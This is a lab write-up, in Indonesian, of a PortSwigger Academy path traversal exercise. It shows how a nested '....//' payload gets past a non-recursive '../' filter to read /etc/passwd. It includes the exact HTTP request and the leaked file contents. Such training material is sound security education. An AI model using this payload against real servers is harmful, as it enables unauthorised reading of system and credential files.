# [PortSwigger Academy] Path Traversal - Lab #3

## 📌 Detail Lab
* **Nama Tantangan:** File path traversal, traversal sequences stripped non-recursively
* **Tingkat Kesulitan:** APPRENTICE
* **Kategori:** Path Traversal (Directory Traversal)
* **Tujuan Lab:** Membaca isi file `/etc/passwd` dengan melakukan bypass pada filter pembersihan non-rekursif menggunakan teknik *nested traversal sequences* (`....//`).

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Aplikasi memuat gambar via parameter `filename` pada endpoint `/image`. Jika kita memasukkan payload standar `../../../../etc/passwd`, aplikasi akan menghapus sekuens `../` sehingga input bersih menjadi `etc/passwd` yang berujung pada error file tidak ditemukan.

Mekanisme pertahanan backend menggunakan fungsi *search-and-replace* sederhana (seperti `preg_replace` atau `replace()` tanpa perulangan/rekursif) untuk membuang string `../`. Kelemahan dari metode non-rekursif ini adalah string hanya diperiksa satu kali. Jika kita menyisipkan `../` di dalam `../` itu sendiri, proses penghapusan justru akan menyatukan sisa karakter yang tertinggal menjadi perintah traversal yang valid.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Konstruksi Payload (Nested Sequences)
Kita manipulasi struktur karakter `../` dengan cara mendobelkan polanya menjadi:
* **`....//`**

Ketika filter backend mendeteksi string `../` yang berada di tengah (`....//`), bagian tersebut akan dihapus. Akibatnya, karakter `..` di depan dan `/` di belakang akan bergabung kembali menjadi `../`.

### Pengiriman Payload via Burp Repeater
Tangkap request pemuatan gambar dengan Burp Suite, lalu ganti parameter `filename` menggunakan sekuens yang sudah digandakan:

* **Payload:** `....//....//....//etc/passwd`

Request HTTP final di Burp Repeater:
```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: 0a3900e704dc963e805fa304002d0046.web-security-academy.net
```

### Hasil Eksekusi di Backend & Respons
Di sisi server, proses pembersihan berjalan seperti ini:

    Input asli: ....//....//....//etc/passwd

    Filter menghapus string ../ yang ditandai: ..[../]/..[../]/..[../]/etc/passwd

    Hasil akhir setelah bersih yang dieksekusi sistem: ../../../etc/passwd

Aplikasi merespons dengan status HTTP 200 OK dan menampilkan isi berkas /etc/passwd:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
```
Hasil Akhir: Strategi menyebarkan komponen payload ke dalam filter non-rekursif berhasil menembus proteksi server. Lab dinyatakan selesai (Solved).